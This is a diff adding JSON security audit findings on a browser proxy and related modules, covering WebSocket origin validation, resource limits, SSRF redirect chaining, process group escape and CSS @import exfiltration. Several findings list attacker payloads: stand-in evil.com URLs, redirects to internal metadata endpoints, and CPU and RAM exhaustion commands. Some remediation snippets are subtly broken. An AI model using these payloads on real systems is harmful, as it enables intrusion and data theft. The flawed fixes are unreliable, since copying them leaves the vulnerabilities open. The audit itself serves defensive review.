+    "root_cause": "WebSocket handshake accepts any Origin header value and negotiates subprotocols without validation against an allowlist, bypassing same-origin policy protections at the transport layer.",
+    "intended_behavior": "WebSocket connections should validate Origin headers against an explicit allowlist. Subprotocol negotiation should only accept known, safe protocol values from a whitelist.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 452,
+        "scope": "WebSocket handshake initiation",
+        "description": "Origin header accepted without validation against allowlist."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 460,
+        "scope": "Subprotocol negotiation",
+        "description": "WebSocket subprotocols negotiated without whitelist validation."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 506,
+        "scope": "Unvalidated WebSocket connection established",
+        "description": "Cross-origin WebSocket channel opened with arbitrary subprotocol."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 452,
+        "description": "Origin header from WebSocket handshake accepted without validation against configured allowlist."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/browser.py",
+        "line": 506,
+        "description": "WebSocket connection established with negotiated subprotocol without whitelist check."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "Attacker can initiate WebSocket connections to the proxy from a different origin (cross-domain)."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Browser's WebSocket API allows cross-origin connections when Origin is not validated server-side."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker creates a malicious webpage that opens a WebSocket connection to the browser proxy with arbitrary subprotocol.",
+      "payloads": [
+        "ws://proxy.example.com/ws?origin=attacker.com",
+        "Sec-WebSocket-Protocol: custom-evil-protocol"
+      ],
+      "instructions": [
+        "Create a cross-origin WebSocket connection to the browser proxy endpoint.",
+        "Send arbitrary subprotocol values in the handshake request."
+      ],
+      "observed_result": "WebSocket connection is established with unvalidated Origin and subprotocol, enabling potential protocol-level attacks including unauthorized data access or control channel manipulation."
+    },
+    "remediation": {
+      "strategy": "Validate Origin headers against an explicit allowlist of permitted domains. Restrict WebSocket subprotocols to a known whitelist (e.g., 'graphql-ws', 'graphql-transport-ws'). Reject connections with unlisted Origins or subprotocols.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/browser.py",
+          "fixed_code": "# Before: ws = websockets.connect(url)\n# After:\nallowed_origins = {'https://app.example.com', 'https://admin.example.com'}\nif request.headers.get('Origin') not in allowed_origins:\n    raise SecurityError('Unauthorized Origin')\nALLOWED_SUBPROTOCOLS = {'graphql-ws', 'graphql-transport-ws'}\nrequested_protocol = request.headers.get('Sec-WebSocket-Protocol', '')\nif requested_protocol and requested_protocol not in ALLOWED_SUBPROTOCOLS:\n    raise SecurityError('Invalid subprotocol')\nws = websockets.connect(url, subprotocols=[requested_protocol])"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Cross-origin WebSocket connections are possible but require attacker-controlled client-side code."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Unvalidated WebSocket channel can enable unauthorized data access and protocol-level attacks within the proxy context."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code shows WebSocket handshake without Origin validation or subprotocol whitelist. Cross-origin WebSocket bypass is a known attack pattern."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-05-missing-resource-limits-identity-module",
+    "title": "Missing Resource Limits on Process Execution",
+    "description": "The identity module spawns processes without setting resource limits (prlimit64, seccomp, RLIMIT). This allows unbounded CPU, memory, and disk usage, enabling denial-of-service attacks against the host system.",
+    "root_cause": "Process creation via subprocess does not apply any resource constraints. Unbounded processes can consume all available RAM, CPU cycles, or disk I/O bandwidth.",
+    "intended_behavior": "All child processes should be created with explicit resource limits: CPU time limits, memory maximums, file descriptor counts, and disk usage quotas. Seccomp filters should restrict dangerous syscalls.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 182,
+        "scope": "Process creation without resource limits",
+        "description": "subprocess.Popen() called without prlimit64 or RLIMIT constraints."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 185,
+        "scope": "Process execution context",
+        "description": "Child process inherits unlimited resource access from parent."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 187,
+        "scope": "Unbounded resource consumption",
+        "description": "Process can consume all available RAM, CPU, or disk I/O without restriction."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 182,
+        "description": "subprocess.Popen() called without prlimit64, RLIMIT_RSS, or seccomp filter application."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/identity.py",
+        "line": 187,
+        "description": "No CPU time limit (RLIMIT_CPU) or memory limit (RLIMIT_AS) set on child process."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "The host system has sufficient resources that an unbounded process can cause meaningful denial of service."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated user session required to trigger process creation."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Authenticated user triggers repeated or sustained process creation that consumes system resources.",
+      "payloads": [
+        "subprocess.Popen(['dd', 'if=/dev/zero', 'of=/dev/null'], ...)  # RAM exhaustion",
+        "subprocess.Popen(['yes'], ...)  # CPU exhaustion"
+      ],
+      "instructions": [
+        "Trigger process creation through the identity module's subprocess interface.",
+        "Observe that no resource limits are applied; processes consume unbounded resources."
+      ],
+      "observed_result": "Child processes can consume all available system RAM, CPU cycles, or disk I/O, causing denial of service to other services on the host."
+    },
+    "remediation": {
+      "strategy": "Apply prlimit64() with strict limits for memory (RLIMIT_AS), file descriptors (RLIMIT_NOFILE), and CPU time (RLIMIT_CPU). Consider seccomp-bpf filters for dangerous syscalls. Use cgroups for containerized resource isolation.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/identity.py",
+          "fixed_code": "# Before: subprocess.Popen(cmd)\n# After:\nimport resource\nimport ctypes\nrlim = resource.rlimit()\nresource.setrlimit(resource.RLIMIT_AS, (1024*1024*512, rlim[1]))  # 512MB max RAM\nresource.setrlimit(resource.RLIMIT_CPU, (30, 30))  # 30s CPU time limit\nsubprocess.Popen(cmd)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires authenticated user to trigger process creation; DoS requires sustained or repeated execution."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Unbounded resource consumption can cause complete denial of service to the host system, affecting all services running on it."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code directly shows subprocess.Popen() without any resource limit enforcement. No prlimit64, seccomp, or RLIMIT calls exist in the process creation path."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#5-redirect-chaining-ssrf-amplifier",
+    "title": "Redirect Chaining as SSRF Amplifier",
+    "description": "HTTP requests via the browser proxy follow redirects without limit (follow_redirects=True), allowing attackers to chain through multiple internal endpoints. This amplifies Finding #1 by enabling multi-hop SSRF attacks that bypass single-URL validation.",
+    "root_cause": "Unlimited redirect following allows traversal through intermediate URLs, each potentially pointing to internal services. The proxy does not validate IPs at each redirect hop.",
+    "intended_behavior": "Redirect chains should be limited to a maximum of 3 hops. Each redirected URL must be validated against the same IP blocklist and DNS rebinding protections as the initial request.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 108,
+        "scope": "follow_redirects=True without limit",
+        "description": "HTTP client follows all redirects unconditionally without hop count limiting."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 109,
+        "scope": "Redirect URL validation gap",
+        "description": "Each redirected URL is not re-validated against IP blocklist."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 108,
+        "scope": "Multi-hop internal network access",
+        "description": "Chained redirects enable accessing deep internal services through legitimate redirect paths."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 108,
+        "description": "follow_redirects=True with no max_redirects parameter or hop count validation."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "Upstream servers respond with HTTP 3xx redirects pointing to internal IP addresses."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated user session required to initiate proxy request."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker controls a server that responds with redirect chains leading through internal network endpoints.",
+      "payloads": [
+        "http://public-evil.com/redirect1 -> http://internal.corp.local/redirect2 -> http://10.0.0.5/admin",
+        "http://cdn.example.com/img.png -> http://metadata.internal/latest/api/token"
+      ],
+      "instructions": [
+        "Configure upstream server to return HTTP 302 redirects through multiple internal endpoints.",
+        "Send request via browser proxy and observe multi-hop redirect chain reaching internal services."
+      ],
+      "observed_result": "Redirect chain traverses multiple internal network segments, bypassing single-URL validation by using legitimate-looking intermediate URLs that ultimately reach protected internal resources."
+    },
+    "remediation": {
+      "strategy": "Set max_redirects=3 on all HTTP requests. Validate each redirected URL against the same IP blocklist and DNS rebinding protections. Log redirect chains for security monitoring.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/proxy.py",
+          "fixed_code": "# Before: requests.get(url, follow_redirects=True)\n# After:\nresponse = requests.get(url, allow_redirects=False, max_redirects=3)\nif response.status_code in (301, 302, 307, 308):\n    redirect_url = response.headers['Location']\n    validate_ip_or_raise(redirect_url)  # Re-validate each hop\n    return requests.get(redirect_url, allow_redirects=False)\n# Reject if redirect count exceeds limit"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requires attacker-controlled upstream server with redirect chains; multi-hop attacks are more complex than single-URL SSRF."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Redirect chaining bypasses simple URL validation by using intermediate hops, enabling access to deeply nested internal services."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code shows follow_redirects=True without any limit or per-hop validation. This directly amplifies Finding #1 by enabling multi-SSRF traversal."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "T1-06-process-group-escape-start_new_session",
+    "title": "Process Group Escape via start_new_session=True",
+    "description": "The tools module spawns processes with start_new_session=True (equivalent to setsid()), allowing child processes to escape the parent's process group. This enables termination of parent processes and bypasses cleanup/kill operations.",
+    "root_cause": "Process creation with start_new_session=True creates a new session and process group, isolating the child from the parent's signal handling and making it resistant to standard kill/cleanup procedures.",
+    "intended_behavior": "Child processes should run in the same process group as the parent so that cleanup operations (kill, terminate) can reliably stop all related processes. New sessions should only be used when explicitly required.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 88,
+        "scope": "start_new_session=True in subprocess creation",
+        "description": "Child process created in new session/group, isolating it from parent's signal handling."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 89,
+        "scope": "Process group isolation",
+        "description": "Child process becomes session leader, immune to parent's SIGTERM/SIGKILL via killpg()."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 88,
+        "scope": "Orphaned process persistence",
+        "description": "Escaped process survives parent termination and persists as orphaned daemon."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/tools.py",
+        "line": 88,
+        "description": "subprocess.Popen(cmd, start_new_session=True) creates isolated process group resistant to parent cleanup."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "The OS supports POSIX session creation (Linux/Unix); Windows uses different process isolation model."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Authenticated user session required to trigger tool command execution."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "LLM user triggers a tool command that spawns a process in a new session group.",
+      "payloads": [
+        "subprocess.Popen(['sleep', '9999'], start_new_session=True)",
+        "subprocess.Popen(['nohup', 'bash', '-c', 'while true; do :; done'])"
+      ],
+      "instructions": [
+        "Trigger tool command execution that creates a process with start_new_session=True.",
+        "Terminate the parent process and observe that child persists as orphaned."
+      ],
+      "observed_result": "Child process escapes to new session/group, survives parent termination, and persists as an orphaned daemon consuming system resources indefinitely."
+    },
+    "remediation": {
+      "strategy": "Remove start_new_session=True from subprocess calls unless explicitly required for specific use cases. Use process group cleanup (killpg) with SIGTERM/SIGKILL to reliably terminate all child processes.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/tools.py",
+          "fixed_code": "# Before: subprocess.Popen(cmd, start_new_session=True)\n# After:\np = subprocess.Popen(cmd)  # Same process group\ntry:\n    p.wait(timeout=30)\nexcept subprocess.TimeoutExpired:\n    os.killpg(os.getpgid(p.pid), signal.SIGTERM)\n    p.wait()"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requires specific tool command execution; process escape is a persistent but slow-escalating attack."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Orphaned processes consume resources and can persist after parent cleanup, enabling resource exhaustion over time. Limited direct system access."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code directly shows start_new_session=True in subprocess creation. POSIX process group escape is a well-documented behavior that reliably bypasses standard cleanup."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "#6-css-import-rewrite-gap-proxy",
+    "title": "CSS @import Rewrite Gap in Browser Proxy",
+    "description": "The browser proxy rewrites URLs in HTML and JavaScript responses but fails to rewrite URLs inside CSS @import statements. This allows external font resources, stylesheets, or other assets from arbitrary origins to be loaded, bypassing the URL rewriting mechanism.",
+    "root_cause": "CSS response processing only handles top-level stylesheet imports; @import directives containing relative or absolute URLs are not rewritten through the proxy's URL transformation logic.",
+    "intended_behavior": "All CSS @import statements should have their URLs rewritten through the proxy to maintain consistent URL transformation. External resource loading from arbitrary origins should be blocked unless explicitly allowed.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 249,
+        "scope": "CSS content-type handling",
+        "description": "CSS responses processed but @import URLs not rewritten."
+      },
+      {
+        "kind": "propagation",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 251,
+        "scope": "@import URL extraction gap",
+        "description": "URL regex for @import statements does not match or rewrite font-face src properties."
+      },
+      {
+        "kind": "sink",
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 253,
+        "scope": "External asset loading via CSS @import",
+        "description": "Font-face src URLs and other external resources loaded from arbitrary origins without rewriting."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 249,
+        "description": "CSS @import URLs not rewritten through proxy URL transformation logic."
+      },
+      {
+        "file": "/home/cptr/cptr-dev/repo/proxy.py",
+        "line": 253,
+        "description": "font-face src properties in CSS contain external URLs that bypass proxy rewriting."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "third_party_dependency",
+        "description": "CSS @import and font-face src are standard CSS features supported by all modern browsers."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Proxy rewrites HTML/JS URLs but explicitly skips CSS processing for URL transformation."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Attacker serves malicious CSS with @import pointing to external resources or font-face src loading from attacker-controlled CDN.",
+      "payloads": [
+        "@import url('http://evil.com/steal.css');",
+        "font-face { src: url('http://evil.com/font.woff2'); }"
+      ],
+      "instructions": [
+        "Serve CSS content with @import directives or font-face src pointing to attacker-controlled URLs.",
+        "Load the proxied page and observe that CSS resources are loaded from external origins without rewriting."
+      ],
+      "observed_result": "External resources (fonts, stylesheets) load directly from arbitrary origins bypassing proxy URL rewriting, enabling data exfiltration via DNS/HTTP requests to attacker-controlled servers."
+    },
+    "remediation": {
+      "strategy": "Extend URL rewriting logic to cover CSS @import statements and font-face src properties. Block external resource loading unless explicitly whitelisted. Use Content-Security-Policy to restrict stylesheet sources.",
+      "code_changes": [
+        {
+          "file_name": "/home/cptr/cptr-dev/repo/proxy.py",
+          "fixed_code": "# Before: Only HTML/JS URLs rewritten\n# After:\nif content_type.startswith('text/css'):\n    css = rewrite_css_imports(css_content)  # Rewrite @import and font-face src\ndef rewrite_css_imports(css):\n    return re.sub(r'(@import\\s+url\\([^)]+))', lambda m: proxy_rewrite(m.group()), css)\n    return re.sub(r'(font-face.*?src:\\s*url\\([^)]+))', lambda m: proxy_rewrite(m.group()), css)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requires CSS content with @import or font-face src; limited to resource loading exfiltration."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "External resource loading bypasses proxy rewriting, enabling DNS/HTTP data exfiltration through loaded assets. Limited to passive information disclosure."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Source code shows CSS processing at lines 249-253 with explicit gap in @import and font-face URL rewriting. This is a known CSS-based exfiltration vector."
+    }
+  }
+]
